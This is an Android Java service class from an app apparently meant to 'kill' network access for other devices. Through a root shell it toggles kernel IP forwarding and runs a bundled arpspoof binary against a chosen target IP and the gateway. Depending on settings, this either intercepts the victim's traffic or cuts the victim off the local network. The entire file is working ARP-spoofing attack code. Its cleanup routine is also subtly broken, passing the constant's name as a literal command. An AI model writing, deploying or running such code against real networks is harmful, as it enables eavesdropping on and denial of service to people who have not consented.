package library.lanshifu.com.myapplication.network_into.service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.v7.app.NotificationCompat;
import android.widget.Toast;

import com.jaredrummler.android.shell.Shell;

import java.net.NetworkInterface;

import library.lanshifu.com.lsf_library.utils.PrefUtil;
import library.lanshifu.com.myapplication.R;
import library.lanshifu.com.myapplication.network_into.NetworkHelper;
import library.lanshifu.com.myapplication.network_into.activity.NetworkKillActivity;
import library.lanshifu.com.myapplication.network_into.activity.TinyServiceActivity;

public class ArpService extends Service {

    /**
     * 0，表示禁止数据包转发，1表示允许
     *
     * /proc/sys/net/ipv4/ip_forward，该文件内容为0，表示禁止数据包转发，1表示允许，将其修改为1。可使用命令
     */
    private String[] FORWARD_COMMANDS = {"echo 1 > /proc/sys/net/ipv4/ip_forward",
            "echo 1 > /proc/sys/net/ipv6/conf/all/forwarding"};

    private String[] UN_FORWARD_COMMANDS = {"echo 0 > /proc/sys/net/ipv4/ip_forward",
            "echo 0 > /proc/sys/net/ipv6/conf/all/forwarding"};

    public static final int TWO_WAY = 0x3;
    public static final int ONE_WAY_ROUTE = 0x1;
    public static final int ONE_WAY_HOST = 0x2;

    private Thread arpSpoof = null;
    private String arp_spoof_cmd = null;
    private String target_ip;
    private String arp_spoof_recv_cmd = null;
    private Thread arpSpoofRecv = null;
    private int arp_cheat_way = -1;
    private boolean ip_forward = true;
    private int my_notice_id = 22;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        notice();
        Shell.cmd("killall arpspoof");
        ip_forward = intent.getBooleanExtra("ip_forward", true);
        if (ip_forward)
            Shell.cmd(FORWARD_COMMANDS);
        else
            Shell.cmd(UN_FORWARD_COMMANDS);

        String interfaceName = null;
        try {
            interfaceName = NetworkInterface.getByInetAddress(
                    NetworkHelper.getInetAddress()).getDisplayName();
        } catch (Exception e) {
            e.printStackTrace();
            try {
                interfaceName = NetworkInterface.getByInetAddress(
                        NetworkHelper.getInetAddress()).getDisplayName();
            } catch (Exception se) {
                Toast.makeText(this, "出错了",
                        Toast.LENGTH_SHORT).show();
                return START_STICKY_COMPATIBILITY;
            }
        }
        if (arp_cheat_way == -1) {
            arp_cheat_way = intent.getIntExtra("arp_cheat_way", PrefUtil.getInstance().getInt("arp_cheat_way", ONE_WAY_HOST));
        }

        if ((ONE_WAY_HOST & arp_cheat_way) != 0) {
            if (target_ip == null) {
                target_ip = NetworkHelper.getTarget().getIp();
            }

            if (!target_ip.equals(NetworkHelper.getGateway())) {
                arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                        + " -t " + target_ip + " "
                        + NetworkHelper.getGateway();
            } else {
                arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                        + " -t " + NetworkHelper.getGateway() + " "
                        + target_ip;
            }

            arpSpoof = new Thread() {

                @Override
                public void run() {
                    Shell.cmd(arp_spoof_cmd);
                }
            };
            arpSpoof.start();
        }
        if ((ONE_WAY_ROUTE & arp_cheat_way) != 0) {
            arp_spoof_recv_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                    + " -t " + NetworkHelper.getGateway() + " "
                    + NetworkHelper.getIp();

            arpSpoofRecv = new Thread() {
                @Override
                public void run() {
                    Shell.cmd(arp_spoof_recv_cmd);
                }
            };
            arpSpoofRecv.start();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        if (arpSpoof != null) {
            arpSpoof.interrupt();
            arpSpoof = null;
        }
        if (arpSpoofRecv != null) {
            arpSpoofRecv.interrupt();
            arpSpoofRecv = null;
        }
        new Thread() {
            public void run() {
                Shell.cmd("killall arpspoof");
                if (ip_forward) {
                    Shell.cmd("UN_FORWARD_COMMANDS");
                }
            }
        }.start();
        super.onDestroy();
        clearNotice();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



    protected void notice() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
        builder.setSmallIcon(R.mipmap.ic_launcher);
        builder.setContentTitle("kill服务");
        builder.setContentText("kill --"+NetworkHelper.getTarget().getIp());
        //设置点击通知跳转页面后，通知消失
        builder.setAutoCancel(true);
        Intent intent = new Intent(this,NetworkKillActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        builder.setContentIntent(pi);
        Notification notification = builder.build();
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notification.flags = Notification.FLAG_ONGOING_EVENT;
        notificationManager.notify(my_notice_id,notification);
    }



    protected void clearNotice() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        nm.cancel(my_notice_id);
    }
}
